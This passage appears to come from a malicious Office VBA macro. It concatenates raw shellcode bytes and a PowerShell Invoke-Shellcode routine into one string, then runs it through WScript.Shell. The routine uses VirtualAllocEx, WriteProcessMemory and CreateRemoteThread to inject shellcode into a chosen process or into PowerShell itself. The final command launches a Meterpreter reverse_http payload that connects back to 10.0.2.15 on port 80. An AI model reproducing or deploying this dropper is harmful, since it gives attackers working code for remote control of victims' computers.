        LqkUN = LqkUN + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        LqkUN = LqkUN + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        LqkUN = LqkUN + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        LqkUN = LqkUN + "                             0x59,0x5a,0x48,0x8b,0"
        LqkUN = LqkUN + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        LqkUN = LqkUN + "x00,0x00,
                                  0x00,0"
        LqkUN = LqkUN + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        LqkUN = LqkUN + "x00,0x41,0xba,0x31,0x8b,
                         "
        LqkUN = LqkUN + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        LqkUN = LqkUN + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        LqkUN = LqkUN + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        LqkUN = LqkUN + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        LqkUN = LqkUN + "x47,
                                  0x13,0x72,0"
        LqkUN = LqkUN + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        LqkUN = LqkUN + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        LqkUN = LqkUN + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        LqkUN = LqkUN + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        LqkUN = LqkUN + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        LqkUN = LqkUN + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        LqkUN = LqkUN + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        LqkUN = LqkUN + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        LqkUN = LqkUN + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        LqkUN = LqkUN + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        LqkUN = LqkUN + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        LqkUN = LqkUN + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        LqkUN = LqkUN + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        LqkUN = LqkUN + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        LqkUN = LqkUN + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        LqkUN = LqkUN + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        LqkUN = LqkUN + "ernel32.dll WriteProcessMemory
        $WriteProce"
        LqkUN = LqkUN + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        LqkUN = LqkUN + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        LqkUN = LqkUN + "()) ([Bool])
        $WriteProcessMemory = [System"
        LqkUN = LqkUN + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        LqkUN = LqkUN + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        LqkUN = LqkUN + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        LqkUN = LqkUN + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        LqkUN = LqkUN + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        LqkUN = LqkUN + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        LqkUN = LqkUN + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        LqkUN = LqkUN + "eateRemoteThread = [System.Runtime.InteropServices"
        LqkUN = LqkUN + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        LqkUN = LqkUN + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        LqkUN = LqkUN + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        LqkUN = LqkUN + " CloseHandle
        $CloseHandleDelegate = Get-De"
        LqkUN = LqkUN + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        LqkUN = LqkUN + "le = [System.Runtime.InteropServices.Marshal]::Get"
        LqkUN = LqkUN + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        LqkUN = LqkUN + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        LqkUN = LqkUN + ".ShouldContinue( 'Do you wish to carry out your ev"
        LqkUN = LqkUN + "il plans?',
                 "Injecting shellcode "
        LqkUN = LqkUN + "injecting into $((Get-Process -Id $ProcessId).Proc"
        LqkUN = LqkUN + "essName) ($ProcessId)!" ) )
        {
            "
        LqkUN = LqkUN + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        LqkUN = LqkUN + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        LqkUN = LqkUN + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        LqkUN = LqkUN + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        LqkUN = LqkUN + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        LqkUN = LqkUN + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        LqkUN = LqkUN + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        LqkUN = LqkUN + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        LqkUN = LqkUN + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        LqkUN = LqkUN + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        LqkUN = LqkUN + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        LqkUN = LqkUN + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        LqkUN = LqkUN + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        LqkUN = LqkUN + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        LqkUN = LqkUN + "rocAddress kernel32.dll CreateThread
        $Crea"
        LqkUN = LqkUN + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        LqkUN = LqkUN + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        LqkUN = LqkUN + "IntPtr])
        $CreateThread = [System.Runtime.I"
        LqkUN = LqkUN + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        LqkUN = LqkUN + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        LqkUN = LqkUN + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        LqkUN = LqkUN + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        LqkUN = LqkUN + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        LqkUN = LqkUN + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        LqkUN = LqkUN + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        LqkUN = LqkUN + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        LqkUN = LqkUN + "ForSingleObjectDelegate)
        if ( $Force -or $"
        LqkUN = LqkUN + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        LqkUN = LqkUN + " your evil plans?',
                 "Injecting sh"
        LqkUN = LqkUN + "ellcode into the running PowerShell process!" ) )
"
        LqkUN = LqkUN + "        {
            Inject-LocalShellcode
      "
        LqkUN = LqkUN + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        LqkUN = LqkUN + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        LqkUN = LqkUN + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(LqkUN)
End Function

